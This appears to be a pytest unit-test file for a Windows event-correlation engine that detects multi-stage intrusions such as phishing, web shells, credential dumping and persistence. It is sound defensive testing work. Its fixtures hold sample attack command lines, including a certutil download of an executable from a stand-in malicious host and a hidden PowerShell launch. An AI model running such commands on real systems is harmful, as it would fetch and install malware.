"""Unit tests for lineage-aware AttackChainEngine and sliding-window correlation."""

from __future__ import annotations

from datetime import datetime, timedelta, timezone

import pytest

from app.analyzers.process_analyzer import ProcessNode, ProcessTreeGraph
from app.correlation.chain_engine import AttackChainEngine
from app.correlation.chains import (
    CHAIN_CREDDUMP_LAT,
    CHAIN_LOTL_PERSIST,
    CHAIN_PHISH,
    CHAIN_WEBSHELL,
)
from app.models.events import EventCategory, NormalizedEvent


def make_event(**kwargs) -> NormalizedEvent:
    defaults = {
        "event_id": 1,
        "record_id": 1,
        "event_hash": "b" * 64,
        "provider": "Microsoft-Windows-Sysmon",
        "channel": "Microsoft-Windows-Sysmon/Operational",
        "computer": "CORP-WS-01",
        "timestamp": datetime(2026, 11, 4, 10, 0, 0, tzinfo=timezone.utc),
        "event_category": EventCategory.PROCESS,
        "event_type": "PROCESS_CREATE",
        "user": r"CORP\alice",
        "raw_payload": "{}",
    }
    defaults.update(kwargs)
    return NormalizedEvent(**defaults)


# =============================================================================
# Test 1: Chain 1 - Malicious Document / Phishing
# =============================================================================

def test_chain_1_phishing_correlation_success() -> None:
    """Verify WINWORD.EXE -> powershell.exe -> Network Egress correlates to CHAIN-PHISH-001."""
    t0 = datetime(2026, 11, 4, 10, 0, 0, tzinfo=timezone.utc)
    t1 = t0 + timedelta(minutes=5)
    t2 = t0 + timedelta(minutes=12)

    word_guid = "{11111111-1111-1111-1111-111111111111}"
    pwsh_guid = "{22222222-2222-2222-2222-222222222222}"

    ev1 = make_event(
        record_id=101,
        timestamp=t0,
        image=r"C:\Program Files\Microsoft Office\Office16\WINWORD.EXE",
        command_line=r'"WINWORD.EXE" "C:\Users\alice\Invoice.docm"',
        process_guid=word_guid,
        process_id=5000,
    )
    ev2 = make_event(
        record_id=102,
        timestamp=t1,
        image=r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
        command_line=r"powershell.exe -enc SQBFAFgA...",
        process_guid=pwsh_guid,
        process_id=5100,
        parent_process_guid=word_guid,
        parent_process_id=5000,
    )
    ev3 = make_event(
        record_id=103,
        event_id=3,
        event_category=EventCategory.NETWORK,
        event_type="NETWORK_CONNECT",
        timestamp=t2,
        image=r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
        process_guid=pwsh_guid,
        process_id=5100,
        destination_ip="198.51.100.77",
        destination_port=443,
    )

    ptree = ProcessTreeGraph()
    ptree.add_process(
        ProcessNode(
            process_guid=word_guid,
            process_id=5000,
            computer="CORP-WS-01",
            image=r"C:\Program Files\Microsoft Office\Office16\WINWORD.EXE",
            start_time=t0,
        )
    )
    ptree.add_process(
        ProcessNode(
            process_guid=pwsh_guid,
            process_id=5100,
            computer="CORP-WS-01",
            image=r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
            parent_process_guid=word_guid,
            start_time=t1,
        )
    )

    engine = AttackChainEngine(chains=[CHAIN_PHISH], window_minutes=30)
    incidents = engine.evaluate(events=[ev1, ev2, ev3], process_tree=ptree)

    assert len(incidents) == 1
    inc = incidents[0]
    assert inc.chain_id == "CHAIN-PHISH-001"
    assert inc.severity == "Critical"
    assert inc.status == "New"
    assert inc.computer == "CORP-WS-01"
    assert inc.root_process_guid == word_guid
    assert len(inc.stages) == 3
    assert inc.stages[0].stage_name == "Productivity Software Execution"
    assert inc.stages[1].stage_name == "Script or Shell Interpreter Spawn"
    assert inc.stages[2].stage_name == "Outbound Network Egress or Persistence"
    assert inc.duration_seconds == 720.0  # 12 minutes = 720s
    assert inc.participating_event_ids == [101, 102, 103]


# =============================================================================
# Test 2: Chain 2 - Web Shell / Server Exploitation
# =============================================================================

def test_chain_2_webshell_correlation_success() -> None:
    """Verify w3wp.exe -> cmd.exe -> whoami.exe correlates to CHAIN-WEBSHELL-001."""
    t0 = datetime(2026, 11, 4, 14, 0, 0, tzinfo=timezone.utc)
    t1 = t0 + timedelta(minutes=2)
    t2 = t0 + timedelta(minutes=4)

    w3wp_guid = "{33333333-3333-3333-3333-333333333333}"
    cmd_guid = "{44444444-4444-4444-4444-444444444444}"
    whoami_guid = "{55555555-5555-5555-5555-555555555555}"

    ev1 = make_event(
        record_id=201,
        computer="IIS-WEB-01",
        user="IIS APPPOOL\\DefaultAppPool",
        timestamp=t0,
        image=r"C:\Windows\System32\inetsrv\w3wp.exe",
        process_guid=w3wp_guid,
        process_id=2200,
    )
    ev2 = make_event(
        record_id=202,
        computer="IIS-WEB-01",
        user="IIS APPPOOL\\DefaultAppPool",
        timestamp=t1,
        image=r"C:\Windows\System32\cmd.exe",
        command_line="cmd.exe /c whoami",
        process_guid=cmd_guid,
        process_id=2300,
        parent_process_guid=w3wp_guid,
    )
    ev3 = make_event(
        record_id=203,
        computer="IIS-WEB-01",
        user="IIS APPPOOL\\DefaultAppPool",
        timestamp=t2,
        image=r"C:\Windows\System32\whoami.exe",
        command_line="whoami /all",
        process_guid=whoami_guid,
        process_id=2400,
        parent_process_guid=cmd_guid,
    )

    ptree = ProcessTreeGraph()
    ptree.add_process(
        ProcessNode(process_guid=w3wp_guid, process_id=2200, computer="IIS-WEB-01", image=ev1.image, start_time=t0)
    )
    ptree.add_process(
        ProcessNode(process_guid=cmd_guid, process_id=2300, computer="IIS-WEB-01", image=ev2.image, parent_process_guid=w3wp_guid, start_time=t1)
    )
    ptree.add_process(
        ProcessNode(process_guid=whoami_guid, process_id=2400, computer="IIS-WEB-01", image=ev3.image, parent_process_guid=cmd_guid, start_time=t2)
    )

    engine = AttackChainEngine(chains=[CHAIN_WEBSHELL])
    incidents = engine.evaluate(events=[ev1, ev2, ev3], process_tree=ptree)

    assert len(incidents) == 1
    inc = incidents[0]
    assert inc.chain_id == "CHAIN-WEBSHELL-001"
    assert inc.computer == "IIS-WEB-01"
    assert len(inc.stages) == 3
    assert inc.stages[0].stage_name == "Web Server Worker Execution"
    assert inc.stages[2].stage_name == "Reconnaissance or Persistence Creation"


# =============================================================================
# Test 3: Chain 3 - Credential Dumping to Lateral Movement
# =============================================================================

def test_chain_3_creddump_lateral_success() -> None:
    """Verify LSASS access followed by lateral RFC1918 egress correlates to CHAIN-CREDDUMP-LAT-001."""
    t0 = datetime(2026, 11, 4, 16, 0, 0, tzinfo=timezone.utc)
    t1 = t0 + timedelta(minutes=15)

    ev1 = make_event(
        record_id=301,
        event_id=10,
        event_category=EventCategory.PROCESS_ACCESS,
        timestamp=t0,
        computer="DEV-PC-01",
        user=r"CORP\admin_user",
        image=r"C:\Windows\System32\rundll32.exe",
        target_image=r"C:\Windows\System32\lsass.exe",
        granted_access="0x1010",
    )
    ev2 = make_event(
        record_id=302,
        event_id=3,
        event_category=EventCategory.NETWORK,
        event_type="NETWORK_CONNECT",
        timestamp=t1,
        computer="DEV-PC-01",
        user=r"CORP\admin_user",
        image=r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
        destination_ip="10.0.10.55",
        destination_port=445,
    )

    engine = AttackChainEngine(chains=[CHAIN_CREDDUMP_LAT])
    incidents = engine.evaluate(events=[ev1, ev2])

    assert len(incidents) == 1
    inc = incidents[0]
    assert inc.chain_id == "CHAIN-CREDDUMP-LAT-001"
    assert inc.severity == "Critical"
    assert len(inc.stages) == 2
    assert inc.stages[0].stage_name == "LSASS Memory Access or Thread Injection"
    assert inc.stages[1].stage_name == "Lateral Internal Egress or Remote Execution"


# =============================================================================
# Test 4: Chain 4 - Living-off-the-Land to Persistence
# =============================================================================

def test_chain_4_lotl_persistence_success() -> None:
    """Verify certutil download -> Temp exe drop -> Run key correlates to CHAIN-LOTL-PERSIST-001."""
    t0 = datetime(2026, 11, 4, 18, 0, 0, tzinfo=timezone.utc)
    t1 = t0 + timedelta(minutes=3)
    t2 = t0 + timedelta(minutes=8)

    ev1 = make_event(
        record_id=401,
        timestamp=t0,
        image=r"C:\Windows\System32\certutil.exe",
        command_line="certutil -urlcache -split -f http://mal.server/b.exe C:\\Temp\\b.exe",
    )
    ev2 = make_event(
        record_id=402,
        event_id=11,
        event_category=EventCategory.FILE,
        timestamp=t1,
        image=r"C:\Windows\System32\certutil.exe",
        target_filename=r"C:\Users\victim\AppData\Local\Temp\b.exe",
    )
    ev3 = make_event(
        record_id=403,
        event_id=13,
        event_category=EventCategory.REGISTRY,
        timestamp=t2,
        registry_target_object=r"HKCU\Software\Microsoft\Windows\CurrentVersion\Run\MyMalware",
    )

    engine = AttackChainEngine(chains=[CHAIN_LOTL_PERSIST])
    incidents = engine.evaluate(events=[ev1, ev2, ev3])

    assert len(incidents) == 1
    inc = incidents[0]
    assert inc.chain_id == "CHAIN-LOTL-PERSIST-001"
    assert len(inc.stages) == 3
    assert inc.stages[0].stage_name == "LOLBin Ingress Tool Transfer"
    assert inc.stages[1].stage_name == "Suspicious Executable File Drop"
    assert inc.stages[2].stage_name == "Auto-Start Persistence Installation"


# =============================================================================
# Test 5: Sliding Temporal Window Rejection
# =============================================================================

def test_sliding_temporal_window_rejection() -> None:
    """Verify stages occurring outside the 30-minute window are rejected."""
    t0 = datetime(2026, 11, 4, 10, 0, 0, tzinfo=timezone.utc)
    t_beyond = t0 + timedelta(minutes=35)  # 35 minutes > 30-min window

    word_guid = "{11111111-1111-1111-1111-111111111111}"
    pwsh_guid = "{22222222-2222-2222-2222-222222222222}"

    ev1 = make_event(
        record_id=501,
        timestamp=t0,
        image=r"C:\Program Files\Microsoft Office\Office16\WINWORD.EXE",
        process_guid=word_guid,
    )
    ev2 = make_event(
        record_id=502,
        timestamp=t_beyond,
        image=r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
        process_guid=pwsh_guid,
        parent_process_guid=word_guid,
    )
    ev3 = make_event(
        record_id=503,
        event_id=3,
        event_category=EventCategory.NETWORK,
        timestamp=t_beyond + timedelta(minutes=1),
        process_guid=pwsh_guid,
        destination_ip="198.51.100.1",
    )

    ptree = ProcessTreeGraph()
    ptree.add_process(ProcessNode(process_guid=word_guid, process_id=100, computer="CORP-WS-01", image=ev1.image, start_time=t0))
    ptree.add_process(ProcessNode(process_guid=pwsh_guid, process_id=200, computer="CORP-WS-01", image=ev2.image, parent_process_guid=word_guid, start_time=t_beyond))

    engine = AttackChainEngine(chains=[CHAIN_PHISH], window_minutes=30)
    incidents = engine.evaluate(events=[ev1, ev2, ev3], process_tree=ptree)

    # Must be rejected because t_beyond > t0 + 30m
    assert len(incidents) == 0


# =============================================================================
# Test 6: Process Lineage Enforcement (Non-Lineage Rejection)
# =============================================================================

def test_lineage_enforcement_rejects_unrelated_processes() -> None:
    """Verify unrelated processes matching Stage 1 and Stage 2 without ancestry do not correlate."""
    t0 = datetime(2026, 11, 4, 10, 0, 0, tzinfo=timezone.utc)
    t1 = t0 + timedelta(minutes=5)
    t2 = t0 + timedelta(minutes=10)

    word_guid = "{11111111-1111-1111-1111-111111111111}"
    unrelated_pwsh_guid = "{99999999-9999-9999-9999-999999999999}"
    explorer_guid = "{00000000-0000-0000-0000-000000000000}"

    ev1 = make_event(
        record_id=601,
        timestamp=t0,
        image=r"C:\Program Files\Microsoft Office\Office16\WINWORD.EXE",
        process_guid=word_guid,
    )
    # Unrelated PowerShell spawned by explorer.exe, NOT WINWORD.EXE
    ev2 = make_event(
        record_id=602,
        timestamp=t1,
        image=r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
        process_guid=unrelated_pwsh_guid,
        parent_process_guid=explorer_guid,
    )
    ev3 = make_event(
        record_id=603,
        event_id=3,
        event_category=EventCategory.NETWORK,
        timestamp=t2,
        process_guid=unrelated_pwsh_guid,
        destination_ip="198.51.100.1",
    )

    ptree = ProcessTreeGraph()
    ptree.add_process(ProcessNode(process_guid=word_guid, process_id=100, computer="CORP-WS-01", image=ev1.image, start_time=t0))
    ptree.add_process(ProcessNode(process_guid=explorer_guid, process_id=50, computer="CORP-WS-01", image="explorer.exe", start_time=t0))
    ptree.add_process(ProcessNode(process_guid=unrelated_pwsh_guid, process_id=200, computer="CORP-WS-01", image=ev2.image, parent_process_guid=explorer_guid, start_time=t1))

    engine = AttackChainEngine(chains=[CHAIN_PHISH], window_minutes=30)
    incidents = engine.evaluate(events=[ev1, ev2, ev3], process_tree=ptree)

    # Lineage check must fail because unrelated_pwsh is not in descendants of word_guid
    assert len(incidents) == 0


# =============================================================================
# Test 7: Host and User Scoping
# =============================================================================

def test_host_scoping_prevents_cross_host_correlation() -> None:
    """Verify events on separate hosts (ComputerA vs ComputerB) never correlate together."""
    t0 = datetime(2026, 11, 4, 10, 0, 0, tzinfo=timezone.utc)
    t1 = t0 + timedelta(minutes=5)

    ev1 = make_event(
        record_id=701,
        computer="HOST-ALPHA",
        event_id=10,
        event_category=EventCategory.PROCESS_ACCESS,
        target_image=r"C:\Windows\System32\lsass.exe",
        granted_access="0x1010",
        timestamp=t0,
    )
    ev2 = make_event(
        record_id=702,
        computer="HOST-BETA",  # Different host
        event_id=3,
        event_category=EventCategory.NETWORK,
        destination_ip="10.0.0.5",
        timestamp=t1,
    )

    engine = AttackChainEngine(chains=[CHAIN_CREDDUMP_LAT])
    incidents = engine.evaluate(events=[ev1, ev2])

    # No incident should be generated across different hosts
    assert len(incidents) == 0


def test_user_scoping_prevents_unrelated_user_correlation() -> None:
    """Verify incompatible users do not correlate."""
    t0 = datetime(2026, 11, 4, 10, 0, 0, tzinfo=timezone.utc)
    t1 = t0 + timedelta(minutes=5)

    ev1 = make_event(
        record_id=703,
        user="Alice",
        event_id=10,
        event_category=EventCategory.PROCESS_ACCESS,
        target_image=r"C:\Windows\System32\lsass.exe",
        granted_access="0x1010",
        timestamp=t0,
    )
    ev2 = make_event(
        record_id=704,
        user="Bob",  # Completely distinct non-system user
        event_id=3,
        event_category=EventCategory.NETWORK,
        destination_ip="10.0.0.5",
        timestamp=t1,
    )

    engine = AttackChainEngine(chains=[CHAIN_CREDDUMP_LAT])
    incidents = engine.evaluate(events=[ev1, ev2])

    assert len(incidents) == 0


# =============================================================================
# Test 8: Incident Deduplication
# =============================================================================

def test_incident_deduplication_on_repeated_events() -> None:
    """Verify repeated events on the same root process do not spawn duplicate incidents."""
    t0 = datetime(2026, 11, 4, 10, 0, 0, tzinfo=timezone.utc)
    word_guid = "{11111111-1111-1111-1111-111111111111}"
    pwsh_guid = "{22222222-2222-2222-2222-222222222222}"

    ev1 = make_event(
        record_id=801,
        timestamp=t0,
        image=r"C:\Program Files\Microsoft Office\Office16\WINWORD.EXE",
        process_guid=word_guid,
    )
    ev2 = make_event(
        record_id=802,
        timestamp=t0 + timedelta(minutes=2),
        image=r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
        process_guid=pwsh_guid,
        parent_process_guid=word_guid,
    )
    # Multiple network connections from same PowerShell process
    ev3_a = make_event(
        record_id=803,
        event_id=3,
        event_category=EventCategory.NETWORK,
        timestamp=t0 + timedelta(minutes=5),
        process_guid=pwsh_guid,
        destination_ip="198.51.100.1",
    )
    ev3_b = make_event(
        record_id=804,
        event_id=3,
        event_category=EventCategory.NETWORK,
        timestamp=t0 + timedelta(minutes=7),
        process_guid=pwsh_guid,
        destination_ip="198.51.100.2",
    )

    ptree = ProcessTreeGraph()
    ptree.add_process(ProcessNode(process_guid=word_guid, process_id=100, computer="CORP-WS-01", image=ev1.image, start_time=t0))
    ptree.add_process(ProcessNode(process_guid=pwsh_guid, process_id=200, computer="CORP-WS-01", image=ev2.image, parent_process_guid=word_guid, start_time=t0 + timedelta(minutes=2)))

    engine = AttackChainEngine(chains=[CHAIN_PHISH])
    incidents = engine.evaluate(events=[ev1, ev2, ev3_a, ev3_b], process_tree=ptree)

    # Exactly 1 incident should be returned, not duplicated
    assert len(incidents) == 1
    assert incidents[0].root_process_guid == word_guid


# =============================================================================
# Test 9: Chronological Narrative Verification
# =============================================================================

def test_incident_chronological_narrative_traceability() -> None:
    """Verify generated incident narrative reflects chronological sequence, timestamps, and IDs."""
    t0 = datetime(2026, 11, 4, 10, 0, 0, tzinfo=timezone.utc)
    t1 = t0 + timedelta(minutes=3)
    t2 = t0 + timedelta(minutes=6)

    word_guid = "{11111111-1111-1111-1111-111111111111}"
    pwsh_guid = "{22222222-2222-2222-2222-222222222222}"

    ev1 = make_event(
        record_id=901,
        timestamp=t0,
        image=r"C:\Program Files\Microsoft Office\Office16\WINWORD.EXE",
        command_line="WINWORD.EXE evil.docm",
        process_guid=word_guid,
    )
    ev2 = make_event(
        record_id=902,
        timestamp=t1,
        image=r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
        command_line="powershell.exe -w hidden",
        process_guid=pwsh_guid,
        parent_process_guid=word_guid,
    )
    ev3 = make_event(
        record_id=903,
        event_id=3,
        event_category=EventCategory.NETWORK,
        timestamp=t2,
        process_guid=pwsh_guid,
        destination_ip="203.0.113.10",
        destination_port=8080,
    )

    ptree = ProcessTreeGraph()
    ptree.add_process(ProcessNode(process_guid=word_guid, process_id=100, computer="CORP-WS-01", image=ev1.image, start_time=t0))
    ptree.add_process(ProcessNode(process_guid=pwsh_guid, process_id=200, computer="CORP-WS-01", image=ev2.image, parent_process_guid=word_guid, start_time=t1))

    engine = AttackChainEngine(chains=[CHAIN_PHISH])
    incidents = engine.evaluate(events=[ev1, ev2, ev3], process_tree=ptree)

    assert len(incidents) == 1
    narrative = incidents[0].summary_narrative
    assert "Correlated Multi-Stage Intrusion: Malicious Document / Phishing Execution" in narrative
    assert "Stage 1: Productivity Software Execution" in narrative
    assert "Stage 2: Script or Shell Interpreter Spawn" in narrative
    assert "Stage 3: Outbound Network Egress or Persistence" in narrative
    assert "WINWORD.EXE" in narrative
    assert "203.0.113.10" in narrative
    assert "Contributing Event IDs: [901, 902, 903]" in narrative
